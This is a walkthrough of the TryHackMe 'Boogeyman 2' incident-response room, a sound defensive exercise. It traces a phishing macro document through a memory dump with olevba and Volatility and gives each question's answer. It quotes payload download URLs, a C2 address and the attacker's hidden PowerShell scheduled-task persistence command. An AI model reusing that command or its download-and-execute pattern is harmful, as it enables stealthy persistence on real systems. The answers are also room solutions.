# Boogeyman 2

### Spear Phishing Human Resources
- What email was used to send the phishing email?<br />
Just open the email in the Artifacts folder:<br />
![image](https://github.com/user-attachments/assets/911cea95-b620-491e-9414-167b6975e472)<br />
`westaylor23@outlook.com`
- What is the email of the victim employee?<br />
`maxine.beck@quicklogisticsorg.onmicrosoft.com`
- What is the name of the attached malicious document?<br />
`Resume_WesleyTaylor.doc`
- What is the MD5 hash of the malicious attachment?<br />
Use `md5sum` to get the answer: <br />
![image](https://github.com/user-attachments/assets/96bbc9c7-65da-4cce-8484-797aa82f77c8)<br />
`52c4384a0b9e248b95804352ebec6c5b`
- What URL is used to download the stage 2 payload based on the document's macro?<br />
Run `olevba Resume_WesleyTaylor.doc` to get the answer:<br />
![image](https://github.com/user-attachments/assets/49bbadfc-0889-4def-84ef-223358a12c23)<br />
`https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.png`
- What is the name of the process that executed the newly downloaded stage 2 payload?<br />
The downloaded file is saved inside `C:\ProgramData\update.js`, which then gets executed by:<br />
![image](https://github.com/user-attachments/assets/80c35c4e-b98b-45e9-b5b8-26767315b8bc)<br />
`wscript.exe`
- What is the full file path of the malicious stage 2 payload?<br />
`C:\ProgramData\update.js`
- What is the PID of the process that executed the stage 2 payload?<br />
At this point I need to start using the volatility framework. It's already installed on the given VM and can be run using `vol -f <filename> <plugins>`. I had to refresh my memory by looking back at the [volatility room](https://tryhackme.com/r/room/volatility) to get some hints on how to use volatility and on which plugins to use.<br />
To list running processes from the dumped memory, run `vol -f WKSTN-2961.raw windows.pslist`:<br />
![image](https://github.com/user-attachments/assets/a3353e4e-a7f2-41d1-b711-c9644ee0cf1b)<br />
`4260`
- What is the parent PID of the process that executed the stage 2 payload?<br />
`1124`
- What URL is used to download the malicious binary executed by the stage 2 payload?<br />
I guess that's the same as before: `https://files.boogeymanisback.lol/aa2a9c53cbb80416d3b47d85538d9971/update.exe`
- What is the PID of the malicious process used to establish the C2 connection?<br />
If we list the process tree using the plugin `windows.pstree`, we can see that the process `wscript.exe` has a child:<br />
![image](https://github.com/user-attachments/assets/2b5777e2-4e40-48df-a3df-96108c3bbfbb)<br />
So `updater.exe` is probably in charge of contacting the C2 (not `conhost.exe`, that's a standard process that runs when we're using a cmd or similar). So the answer is:<br />
`6216`
- What is the full file path of the malicious process used to establish the C2 connection?<br />
For that we can use the `cmdline` plugin. Run `vol -f WKSTN-2961.raw cmdline`:<br />
![image](https://github.com/user-attachments/assets/b65155a3-4f8e-4268-8628-d08f8aa04eb1)<br />
`C:\Windows\Tasks\updater.exe`
- What is the IP address and port of the C2 connection initiated by the malicious binary? (Format: IP address:port)<br />
For this we can use the `netscan` plugin. Run `vol -f WKSTN-2961.raw netscan`:<br /<
![image](https://github.com/user-attachments/assets/c11adf26-d9df-4135-80bf-9cdbdf02a685)<br />
`128.199.95.189:8080`
- What is the full file path of the malicious email attachment based on the memory dump?<br />
For this we can use the `filescan` plugin, which tries to find every possible file from the memory dump. The command I used is `vol -f WKSTN-2961.raw filescan | grep WesleyTaylor`:<br />
![image](https://github.com/user-attachments/assets/6cad6da8-5322-4af9-a6b8-69541db40ba9)<br />
`C:\Users\maxine.beck\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\WQHGZCFI\Resume_WesleyTaylor (002).doc`
- The attacker implanted a scheduled task right after establishing the c2 callback. What is the full command used by the attacker to maintain persistent access?<br />
There's no direct way of doing this from volatility, but we can use the `strings` command on the memory dump and filter by `schtasks`, which is the command used to set a scheduled task. So run `strings WKSTN-2961.raw | grep schtasks`:<br />
![image](https://github.com/user-attachments/assets/ffa5d0e8-ef3c-457e-b723-c387658790ac)<br />
`schtasks /Create /F /SC DAILY /ST 09:00 /TN Updater /TR 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NonI -W hidden -c \"IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:\Software\Microsoft\Windows\CurrentVersion debug).debug)))\"'`
